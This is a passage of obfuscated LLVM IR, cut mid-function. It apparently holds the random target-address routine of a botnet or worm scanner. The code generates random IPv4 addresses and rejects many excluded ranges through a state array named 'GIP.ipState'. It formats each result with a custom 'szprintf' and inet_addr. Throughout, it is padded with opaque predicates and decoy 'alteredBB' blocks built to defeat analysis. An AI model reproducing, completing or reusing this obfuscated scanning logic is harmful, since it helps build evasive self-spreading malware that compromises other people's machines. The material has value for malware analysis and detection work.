  %4771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4772 = zext i8 %4771 to i32
  %4773 = icmp eq i32 %4772, 178
  %4774 = load i32, i32* @x.71
  %4775 = load i32, i32* @y.72
  %4776 = sub i32 %4774, 1
  %4777 = mul i32 %4774, %4776
  %4778 = urem i32 %4777, 2
  %4779 = icmp eq i32 %4778, 0
  %4780 = icmp slt i32 %4775, 10
  %4781 = or i1 %4779, %4780
  br i1 %4781, label %originalBBpart2640, label %originalBB638alteredBB

originalBBpart2640:                               ; preds = %originalBB638
  br i1 %4773, label %4782, label %4806

; <label>:4782:                                   ; preds = %originalBBpart2640
  %4783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4784 = zext i8 %4783 to i32
  %4785 = icmp sge i32 %4784, 62
  br i1 %4785, label %4786, label %4806

; <label>:4786:                                   ; preds = %4782
  %4787 = load i32, i32* @x.71
  %4788 = load i32, i32* @y.72
  %4789 = sub i32 %4787, 1
  %4790 = mul i32 %4787, %4789
  %4791 = urem i32 %4790, 2
  %4792 = icmp eq i32 %4791, 0
  %4793 = icmp slt i32 %4788, 10
  %4794 = or i1 %4792, %4793
  br i1 %4794, label %originalBB642, label %originalBB642alteredBB

originalBB642:                                    ; preds = %originalBB642alteredBB, %4786
  %4795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4796 = zext i8 %4795 to i32
  %4797 = icmp slt i32 %4796, 63
  %4798 = load i32, i32* @x.71
  %4799 = load i32, i32* @y.72
  %4800 = sub i32 %4798, 1
  %4801 = mul i32 %4798, %4800
  %4802 = urem i32 %4801, 2
  %4803 = icmp eq i32 %4802, 0
  %4804 = icmp slt i32 %4799, 10
  %4805 = or i1 %4803, %4804
  br i1 %4805, label %originalBBpart2644, label %originalBB642alteredBB

originalBBpart2644:                               ; preds = %originalBB642
  br i1 %4797, label %5042, label %4806

; <label>:4806:                                   ; preds = %originalBBpart2644, %4782, %originalBBpart2640
  %4807 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4808 = zext i8 %4807 to i32
  %4809 = icmp eq i32 %4808, 106
  br i1 %4809, label %4810, label %4850

; <label>:4810:                                   ; preds = %4806
  %4811 = load i32, i32* @x.71
  %4812 = load i32, i32* @y.72
  %4813 = sub i32 %4811, 1
  %4814 = mul i32 %4811, %4813
  %4815 = urem i32 %4814, 2
  %4816 = icmp eq i32 %4815, 0
  %4817 = icmp slt i32 %4812, 10
  %4818 = or i1 %4816, %4817
  br i1 %4818, label %originalBB646, label %originalBB646alteredBB

originalBB646:                                    ; preds = %originalBB646alteredBB, %4810
  %4819 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4820 = zext i8 %4819 to i32
  %4821 = icmp sge i32 %4820, 182
  %4822 = load i32, i32* @x.71
  %4823 = load i32, i32* @y.72
  %4824 = sub i32 %4822, 1
  %4825 = mul i32 %4822, %4824
  %4826 = urem i32 %4825, 2
  %4827 = icmp eq i32 %4826, 0
  %4828 = icmp slt i32 %4823, 10
  %4829 = or i1 %4827, %4828
  br i1 %4829, label %originalBBpart2648, label %originalBB646alteredBB

originalBBpart2648:                               ; preds = %originalBB646
  br i1 %4821, label %4830, label %4850

; <label>:4830:                                   ; preds = %originalBBpart2648
  %4831 = load i32, i32* @x.71
  %4832 = load i32, i32* @y.72
  %4833 = sub i32 %4831, 1
  %4834 = mul i32 %4831, %4833
  %4835 = urem i32 %4834, 2
  %4836 = icmp eq i32 %4835, 0
  %4837 = icmp slt i32 %4832, 10
  %4838 = or i1 %4836, %4837
  br i1 %4838, label %originalBB650, label %originalBB650alteredBB

originalBB650:                                    ; preds = %originalBB650alteredBB, %4830
  %4839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4840 = zext i8 %4839 to i32
  %4841 = icmp slt i32 %4840, 189
  %4842 = load i32, i32* @x.71
  %4843 = load i32, i32* @y.72
  %4844 = sub i32 %4842, 1
  %4845 = mul i32 %4842, %4844
  %4846 = urem i32 %4845, 2
  %4847 = icmp eq i32 %4846, 0
  %4848 = icmp slt i32 %4843, 10
  %4849 = or i1 %4847, %4848
  br i1 %4849, label %originalBBpart2652, label %originalBB650alteredBB

originalBBpart2652:                               ; preds = %originalBB650
  br i1 %4841, label %5042, label %4850

; <label>:4850:                                   ; preds = %originalBBpart2652, %originalBBpart2648, %4806
  %4851 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4852 = zext i8 %4851 to i32
  %4853 = icmp eq i32 %4852, 106
  br i1 %4853, label %4854, label %4858

; <label>:4854:                                   ; preds = %4850
  %4855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4856 = zext i8 %4855 to i32
  %4857 = icmp sge i32 %4856, 184
  br i1 %4857, label %5042, label %4858

; <label>:4858:                                   ; preds = %4854, %4850
  %4859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4860 = zext i8 %4859 to i32
  %4861 = icmp eq i32 %4860, 106
  br i1 %4861, label %4862, label %4866

; <label>:4862:                                   ; preds = %4858
  %4863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4864 = zext i8 %4863 to i32
  %4865 = icmp eq i32 %4864, 105
  br i1 %4865, label %5042, label %4866

; <label>:4866:                                   ; preds = %4862, %4858
  %4867 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4868 = zext i8 %4867 to i32
  %4869 = icmp eq i32 %4868, 34
  br i1 %4869, label %4870, label %4878

; <label>:4870:                                   ; preds = %4866
  %4871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4872 = zext i8 %4871 to i32
  %4873 = icmp sge i32 %4872, 245
  br i1 %4873, label %4874, label %4878

; <label>:4874:                                   ; preds = %4870
  %4875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4876 = zext i8 %4875 to i32
  %4877 = icmp slt i32 %4876, 255
  br i1 %4877, label %5042, label %4878

; <label>:4878:                                   ; preds = %4874, %4870, %4866
  %4879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4880 = zext i8 %4879 to i32
  %4881 = icmp eq i32 %4880, 87
  br i1 %4881, label %4882, label %4906

; <label>:4882:                                   ; preds = %4878
  %4883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4884 = zext i8 %4883 to i32
  %4885 = icmp sge i32 %4884, 97
  br i1 %4885, label %4886, label %4906

; <label>:4886:                                   ; preds = %4882
  %4887 = load i32, i32* @x.71
  %4888 = load i32, i32* @y.72
  %4889 = sub i32 %4887, 1
  %4890 = mul i32 %4887, %4889
  %4891 = urem i32 %4890, 2
  %4892 = icmp eq i32 %4891, 0
  %4893 = icmp slt i32 %4888, 10
  %4894 = or i1 %4892, %4893
  br i1 %4894, label %originalBB654, label %originalBB654alteredBB

originalBB654:                                    ; preds = %originalBB654alteredBB, %4886
  %4895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4896 = zext i8 %4895 to i32
  %4897 = icmp slt i32 %4896, 99
  %4898 = load i32, i32* @x.71
  %4899 = load i32, i32* @y.72
  %4900 = sub i32 %4898, 1
  %4901 = mul i32 %4898, %4900
  %4902 = urem i32 %4901, 2
  %4903 = icmp eq i32 %4902, 0
  %4904 = icmp slt i32 %4899, 10
  %4905 = or i1 %4903, %4904
  br i1 %4905, label %originalBBpart2656, label %originalBB654alteredBB

originalBBpart2656:                               ; preds = %originalBB654
  br i1 %4897, label %5042, label %4906

; <label>:4906:                                   ; preds = %originalBBpart2656, %4882, %4878
  %4907 = load i32, i32* @x.71
  %4908 = load i32, i32* @y.72
  %4909 = sub i32 %4907, 1
  %4910 = mul i32 %4907, %4909
  %4911 = urem i32 %4910, 2
  %4912 = icmp eq i32 %4911, 0
  %4913 = icmp slt i32 %4908, 10
  %4914 = or i1 %4912, %4913
  br i1 %4914, label %originalBB658, label %originalBB658alteredBB

originalBB658:                                    ; preds = %originalBB658alteredBB, %4906
  %4915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4916 = zext i8 %4915 to i32
  %4917 = icmp eq i32 %4916, 86
  %4918 = load i32, i32* @x.71
  %4919 = load i32, i32* @y.72
  %4920 = sub i32 %4918, 1
  %4921 = mul i32 %4918, %4920
  %4922 = urem i32 %4921, 2
  %4923 = icmp eq i32 %4922, 0
  %4924 = icmp slt i32 %4919, 10
  %4925 = or i1 %4923, %4924
  br i1 %4925, label %originalBBpart2660, label %originalBB658alteredBB

originalBBpart2660:                               ; preds = %originalBB658
  br i1 %4917, label %4926, label %4946

; <label>:4926:                                   ; preds = %originalBBpart2660
  %4927 = load i32, i32* @x.71
  %4928 = load i32, i32* @y.72
  %4929 = sub i32 %4927, 1
  %4930 = mul i32 %4927, %4929
  %4931 = urem i32 %4930, 2
  %4932 = icmp eq i32 %4931, 0
  %4933 = icmp slt i32 %4928, 10
  %4934 = or i1 %4932, %4933
  br i1 %4934, label %originalBB662, label %originalBB662alteredBB

originalBB662:                                    ; preds = %originalBB662alteredBB, %4926
  %4935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4936 = zext i8 %4935 to i32
  %4937 = icmp eq i32 %4936, 208
  %4938 = load i32, i32* @x.71
  %4939 = load i32, i32* @y.72
  %4940 = sub i32 %4938, 1
  %4941 = mul i32 %4938, %4940
  %4942 = urem i32 %4941, 2
  %4943 = icmp eq i32 %4942, 0
  %4944 = icmp slt i32 %4939, 10
  %4945 = or i1 %4943, %4944
  br i1 %4945, label %originalBBpart2664, label %originalBB662alteredBB

originalBBpart2664:                               ; preds = %originalBB662
  br i1 %4937, label %5042, label %4946

; <label>:4946:                                   ; preds = %originalBBpart2664, %originalBBpart2660
  %4947 = load i32, i32* @x.71
  %4948 = load i32, i32* @y.72
  %4949 = sub i32 %4947, 1
  %4950 = mul i32 %4947, %4949
  %4951 = urem i32 %4950, 2
  %4952 = icmp eq i32 %4951, 0
  %4953 = icmp slt i32 %4948, 10
  %4954 = or i1 %4952, %4953
  br i1 %4954, label %originalBB666, label %originalBB666alteredBB

originalBB666:                                    ; preds = %originalBB666alteredBB, %4946
  %4955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4956 = zext i8 %4955 to i32
  %4957 = icmp eq i32 %4956, 86
  %4958 = load i32, i32* @x.71
  %4959 = load i32, i32* @y.72
  %4960 = sub i32 %4958, 1
  %4961 = mul i32 %4958, %4960
  %4962 = urem i32 %4961, 2
  %4963 = icmp eq i32 %4962, 0
  %4964 = icmp slt i32 %4959, 10
  %4965 = or i1 %4963, %4964
  br i1 %4965, label %originalBBpart2668, label %originalBB666alteredBB

originalBBpart2668:                               ; preds = %originalBB666
  br i1 %4957, label %4966, label %4970

; <label>:4966:                                   ; preds = %originalBBpart2668
  %4967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4968 = zext i8 %4967 to i32
  %4969 = icmp eq i32 %4968, 209
  br i1 %4969, label %5042, label %4970

; <label>:4970:                                   ; preds = %4966, %originalBBpart2668
  %4971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4972 = zext i8 %4971 to i32
  %4973 = icmp eq i32 %4972, 193
  br i1 %4973, label %4974, label %4978

; <label>:4974:                                   ; preds = %4970
  %4975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4976 = zext i8 %4975 to i32
  %4977 = icmp eq i32 %4976, 164
  br i1 %4977, label %5042, label %4978

; <label>:4978:                                   ; preds = %4974, %4970
  %4979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4980 = zext i8 %4979 to i32
  %4981 = icmp eq i32 %4980, 120
  br i1 %4981, label %4982, label %4990

; <label>:4982:                                   ; preds = %4978
  %4983 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4984 = zext i8 %4983 to i32
  %4985 = icmp sge i32 %4984, 103
  br i1 %4985, label %4986, label %4990

; <label>:4986:                                   ; preds = %4982
  %4987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4988 = zext i8 %4987 to i32
  %4989 = icmp slt i32 %4988, 108
  br i1 %4989, label %5042, label %4990

; <label>:4990:                                   ; preds = %4986, %4982, %4978
  %4991 = load i32, i32* @x.71
  %4992 = load i32, i32* @y.72
  %4993 = sub i32 %4991, 1
  %4994 = mul i32 %4991, %4993
  %4995 = urem i32 %4994, 2
  %4996 = icmp eq i32 %4995, 0
  %4997 = icmp slt i32 %4992, 10
  %4998 = or i1 %4996, %4997
  br i1 %4998, label %originalBB670, label %originalBB670alteredBB

originalBB670:                                    ; preds = %originalBB670alteredBB, %4990
  %4999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5000 = zext i8 %4999 to i32
  %5001 = icmp eq i32 %5000, 188
  %5002 = load i32, i32* @x.71
  %5003 = load i32, i32* @y.72
  %5004 = sub i32 %5002, 1
  %5005 = mul i32 %5002, %5004
  %5006 = urem i32 %5005, 2
  %5007 = icmp eq i32 %5006, 0
  %5008 = icmp slt i32 %5003, 10
  %5009 = or i1 %5007, %5008
  br i1 %5009, label %originalBBpart2672, label %originalBB670alteredBB

originalBBpart2672:                               ; preds = %originalBB670
  br i1 %5001, label %5010, label %5014

; <label>:5010:                                   ; preds = %originalBBpart2672
  %5011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5012 = zext i8 %5011 to i32
  %5013 = icmp eq i32 %5012, 68
  br i1 %5013, label %5042, label %5014

; <label>:5014:                                   ; preds = %5010, %originalBBpart2672
  %5015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5016 = zext i8 %5015 to i32
  %5017 = icmp eq i32 %5016, 78
  br i1 %5017, label %5018, label %5038

; <label>:5018:                                   ; preds = %5014
  %5019 = load i32, i32* @x.71
  %5020 = load i32, i32* @y.72
  %5021 = sub i32 %5019, 1
  %5022 = mul i32 %5019, %5021
  %5023 = urem i32 %5022, 2
  %5024 = icmp eq i32 %5023, 0
  %5025 = icmp slt i32 %5020, 10
  %5026 = or i1 %5024, %5025
  br i1 %5026, label %originalBB674, label %originalBB674alteredBB

originalBB674:                                    ; preds = %originalBB674alteredBB, %5018
  %5027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5028 = zext i8 %5027 to i32
  %5029 = icmp eq i32 %5028, 46
  %5030 = load i32, i32* @x.71
  %5031 = load i32, i32* @y.72
  %5032 = sub i32 %5030, 1
  %5033 = mul i32 %5030, %5032
  %5034 = urem i32 %5033, 2
  %5035 = icmp eq i32 %5034, 0
  %5036 = icmp slt i32 %5031, 10
  %5037 = or i1 %5035, %5036
  br i1 %5037, label %originalBBpart2676, label %originalBB674alteredBB

originalBBpart2676:                               ; preds = %originalBB674
  br i1 %5029, label %5042, label %5038

; <label>:5038:                                   ; preds = %originalBBpart2676, %5014
  %5039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5040 = zext i8 %5039 to i32
  %5041 = icmp eq i32 %5040, 224
  br label %5042

; <label>:5042:                                   ; preds = %5038, %originalBBpart2676, %5010, %4986, %4974, %4966, %originalBBpart2664, %originalBBpart2656, %4874, %4862, %4854, %originalBBpart2652, %originalBBpart2644, %4758, %4730, %4702, %4670, %4622, %4590, %4578, %4570, %4558, %4546, %4502, %4474, %4462, %originalBBpart2596, %originalBBpart2592, %originalBBpart2584, %originalBBpart2576, %4282, %originalBBpart2564, %4186, %4122, %4074, %4026, %originalBBpart2524, %3946, %3930, %3898, %3866, %3850, %3818, %3786, %3754, %3738, %originalBBpart2488, %3666, %originalBBpart2480, %3602, %originalBBpart2472, %3554, %3546, %3538, %3530, %originalBBpart2464, %3498, %originalBBpart2460, %originalBBpart2456, %3442, %3418, %3410, %originalBBpart2448, %originalBBpart2444, %3330, %originalBBpart2436, %3282, %originalBBpart2432, %3218, %3202, %3186, %3154, %3122, %3090, %originalBBpart2408, %3010, %originalBBpart2400, %originalBBpart2396, %2946, %2930, %2898, %originalBBpart2384, %originalBBpart2380, %2802, %2786, %2754, %2706, %2674, %originalBBpart2356, %originalBBpart2348, %2530, %2498, %2482, %2434, %2418, %originalBBpart2316, %2338, %originalBBpart2312, %originalBBpart2304, %2250, %originalBBpart2300, %originalBBpart2296, %2194, %2186, %2178, %originalBBpart2288, %2130, %2122, %2098, %2090, %2082, %2070, %2058, %originalBBpart2276, %2002, %1990, %originalBBpart2268, %1934, %1922, %originalBBpart2264, %1882, %1870, %1826, %1798, %1786, %1742, %originalBBpart2240, %originalBBpart2236, %1674, %1646, %1634, %1606, %originalBBpart2224, %1550, %1522, %originalBBpart2204, %originalBBpart2196, %1390, %originalBBpart2184, %1318, %1290, %1262, %1250, %originalBBpart2164, %1194, %1182, %1170, %originalBBpart2156, %1114, %originalBBpart2148, %1042, %1030, %1022, %originalBBpart2136, %originalBBpart2128, %926, %902, %878, %870, %862, %originalBBpart2112, %814, %originalBBpart2108, %782, %758, %734, %originalBBpart296, %702, %originalBBpart288, %654, %630, %622, %originalBBpart280, %590, %566, %542, %534, %originalBBpart268, %502, %494, %486, %478, %originalBBpart264, %430, %originalBBpart256, %398, %originalBBpart252, %originalBBpart248, %originalBBpart240, %286, %278, %254, %230, %222, %214, %originalBBpart224, %190, %originalBBpart220, %originalBBpart216, %146, %142, %138, %134, %originalBBpart212, %110, %106, %originalBBpart28, %originalBBpart24, %62, %58, %54, %50, %46, %42, %38, %originalBBpart2, %14
  %5043 = phi i1 [ true, %originalBBpart2676 ], [ true, %5010 ], [ true, %4986 ], [ true, %4974 ], [ true, %4966 ], [ true, %originalBBpart2664 ], [ true, %originalBBpart2656 ], [ true, %4874 ], [ true, %4862 ], [ true, %4854 ], [ true, %originalBBpart2652 ], [ true, %originalBBpart2644 ], [ true, %4758 ], [ true, %4730 ], [ true, %4702 ], [ true, %4670 ], [ true, %4622 ], [ true, %4590 ], [ true, %4578 ], [ true, %4570 ], [ true, %4558 ], [ true, %4546 ], [ true, %4502 ], [ true, %4474 ], [ true, %4462 ], [ true, %originalBBpart2596 ], [ true, %originalBBpart2592 ], [ true, %originalBBpart2584 ], [ true, %originalBBpart2576 ], [ true, %4282 ], [ true, %originalBBpart2564 ], [ true, %4186 ], [ true, %4122 ], [ true, %4074 ], [ true, %4026 ], [ true, %originalBBpart2524 ], [ true, %3946 ], [ true, %3930 ], [ true, %3898 ], [ true, %3866 ], [ true, %3850 ], [ true, %3818 ], [ true, %3786 ], [ true, %3754 ], [ true, %3738 ], [ true, %originalBBpart2488 ], [ true, %3666 ], [ true, %originalBBpart2480 ], [ true, %3602 ], [ true, %originalBBpart2472 ], [ true, %3554 ], [ true, %3546 ], [ true, %3538 ], [ true, %3530 ], [ true, %originalBBpart2464 ], [ true, %3498 ], [ true, %originalBBpart2460 ], [ true, %originalBBpart2456 ], [ true, %3442 ], [ true, %3418 ], [ true, %3410 ], [ true, %originalBBpart2448 ], [ true, %originalBBpart2444 ], [ true, %3330 ], [ true, %originalBBpart2436 ], [ true, %3282 ], [ true, %originalBBpart2432 ], [ true, %3218 ], [ true, %3202 ], [ true, %3186 ], [ true, %3154 ], [ true, %3122 ], [ true, %3090 ], [ true, %originalBBpart2408 ], [ true, %3010 ], [ true, %originalBBpart2400 ], [ true, %originalBBpart2396 ], [ true, %2946 ], [ true, %2930 ], [ true, %2898 ], [ true, %originalBBpart2384 ], [ true, %originalBBpart2380 ], [ true, %2802 ], [ true, %2786 ], [ true, %2754 ], [ true, %2706 ], [ true, %2674 ], [ true, %originalBBpart2356 ], [ true, %originalBBpart2348 ], [ true, %2530 ], [ true, %2498 ], [ true, %2482 ], [ true, %2434 ], [ true, %2418 ], [ true, %originalBBpart2316 ], [ true, %2338 ], [ true, %originalBBpart2312 ], [ true, %originalBBpart2304 ], [ true, %2250 ], [ true, %originalBBpart2300 ], [ true, %originalBBpart2296 ], [ true, %2194 ], [ true, %2186 ], [ true, %2178 ], [ true, %originalBBpart2288 ], [ true, %2130 ], [ true, %2122 ], [ true, %2098 ], [ true, %2090 ], [ true, %2082 ], [ true, %2070 ], [ true, %2058 ], [ true, %originalBBpart2276 ], [ true, %2002 ], [ true, %1990 ], [ true, %originalBBpart2268 ], [ true, %1934 ], [ true, %1922 ], [ true, %originalBBpart2264 ], [ true, %1882 ], [ true, %1870 ], [ true, %1826 ], [ true, %1798 ], [ true, %1786 ], [ true, %1742 ], [ true, %originalBBpart2240 ], [ true, %originalBBpart2236 ], [ true, %1674 ], [ true, %1646 ], [ true, %1634 ], [ true, %1606 ], [ true, %originalBBpart2224 ], [ true, %1550 ], [ true, %1522 ], [ true, %originalBBpart2204 ], [ true, %originalBBpart2196 ], [ true, %1390 ], [ true, %originalBBpart2184 ], [ true, %1318 ], [ true, %1290 ], [ true, %1262 ], [ true, %1250 ], [ true, %originalBBpart2164 ], [ true, %1194 ], [ true, %1182 ], [ true, %1170 ], [ true, %originalBBpart2156 ], [ true, %1114 ], [ true, %originalBBpart2148 ], [ true, %1042 ], [ true, %1030 ], [ true, %1022 ], [ true, %originalBBpart2136 ], [ true, %originalBBpart2128 ], [ true, %926 ], [ true, %902 ], [ true, %878 ], [ true, %870 ], [ true, %862 ], [ true, %originalBBpart2112 ], [ true, %814 ], [ true, %originalBBpart2108 ], [ true, %782 ], [ true, %758 ], [ true, %734 ], [ true, %originalBBpart296 ], [ true, %702 ], [ true, %originalBBpart288 ], [ true, %654 ], [ true, %630 ], [ true, %622 ], [ true, %originalBBpart280 ], [ true, %590 ], [ true, %566 ], [ true, %542 ], [ true, %534 ], [ true, %originalBBpart268 ], [ true, %502 ], [ true, %494 ], [ true, %486 ], [ true, %478 ], [ true, %originalBBpart264 ], [ true, %430 ], [ true, %originalBBpart256 ], [ true, %398 ], [ true, %originalBBpart252 ], [ true, %originalBBpart248 ], [ true, %originalBBpart240 ], [ true, %286 ], [ true, %278 ], [ true, %254 ], [ true, %230 ], [ true, %222 ], [ true, %214 ], [ true, %originalBBpart224 ], [ true, %190 ], [ true, %originalBBpart220 ], [ true, %originalBBpart216 ], [ true, %146 ], [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %originalBBpart212 ], [ true, %110 ], [ true, %106 ], [ true, %originalBBpart28 ], [ true, %originalBBpart24 ], [ true, %62 ], [ true, %58 ], [ true, %54 ], [ true, %50 ], [ true, %46 ], [ true, %42 ], [ true, %38 ], [ true, %originalBBpart2 ], [ true, %14 ], [ %5041, %5038 ]
  %5044 = load i32, i32* @x.71
  %5045 = load i32, i32* @y.72
  %5046 = sub i32 %5044, 1
  %5047 = mul i32 %5044, %5046
  %5048 = urem i32 %5047, 2
  %5049 = icmp eq i32 %5048, 0
  %5050 = icmp slt i32 %5045, 10
  %5051 = or i1 %5049, %5050
  br i1 %5051, label %originalBB678, label %originalBB678alteredBB

originalBB678:                                    ; preds = %originalBB678alteredBB, %5042
  %5052 = load i32, i32* @x.71
  %5053 = load i32, i32* @y.72
  %5054 = sub i32 %5052, 1
  %5055 = mul i32 %5052, %5054
  %5056 = urem i32 %5055, 2
  %5057 = icmp eq i32 %5056, 0
  %5058 = icmp slt i32 %5053, 10
  %5059 = or i1 %5057, %5058
  br i1 %5059, label %originalBBpart2680, label %originalBB678alteredBB

originalBBpart2680:                               ; preds = %originalBB678
  br i1 %5043, label %5060, label %5073

; <label>:5060:                                   ; preds = %originalBBpart2680
  %5061 = call i32 @rand() #3
  %5062 = srem i32 %5061, 223
  %5063 = trunc i32 %5062 to i8
  store i8 %5063, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5064 = call i32 @rand() #3
  %5065 = srem i32 %5064, 255
  %5066 = trunc i32 %5065 to i8
  store i8 %5066, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5067 = call i32 @rand() #3
  %5068 = srem i32 %5067, 255
  %5069 = trunc i32 %5068 to i8
  store i8 %5069, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5070 = call i32 @rand() #3
  %5071 = srem i32 %5070, 255
  %5072 = trunc i32 %5071 to i8
  store i8 %5072, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:5073:                                   ; preds = %originalBBpart2680
  %5074 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5074, i8 0, i64 16, i32 16, i1 false)
  %5075 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %5076 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5077 = zext i8 %5076 to i32
  %5078 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5079 = zext i8 %5078 to i32
  %5080 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5081 = zext i8 %5080 to i32
  %5082 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %5083 = zext i8 %5082 to i32
  %5084 = call i32 (i8*, i8*, ...) @szprintf(i8* %5075, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.95, i32 0, i32 0), i32 %5077, i32 %5079, i32 %5081, i32 %5083)
  %5085 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %5086 = call i32 @inet_addr(i8* %5085) #3
  ret i32 %5086

originalBBalteredBB:                              ; preds = %originalBB, %18
  %5087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5088 = zext i8 %5087 to i32
  %5089 = icmp eq i32 %5088, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %5090 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5091 = zext i8 %5090 to i32
  %5092 = icmp eq i32 %5091, 137
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %5093 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5094 = zext i8 %5093 to i32
  %5095 = icmp eq i32 %5094, 6
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %114
  %5096 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5097 = zext i8 %5096 to i32
  %5098 = icmp eq i32 %5097, 21
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %150
  %5099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5100 = zext i8 %5099 to i32
  %5101 = icmp eq i32 %5100, 30
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %170
  %5102 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5103 = zext i8 %5102 to i32
  %5104 = icmp eq i32 %5103, 33
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %194
  %5105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5106 = zext i8 %5105 to i32
  %5107 = icmp eq i32 %5106, 214
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %234
  %5108 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5109 = zext i8 %5108 to i32
  %5110 = icmp eq i32 %5109, 146
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %258
  %5111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5112 = zext i8 %5111 to i32
  %5113 = icmp eq i32 %5112, 146
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %290
  %5114 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5115 = zext i8 %5114 to i32
  %5116 = icmp eq i32 %5115, 147
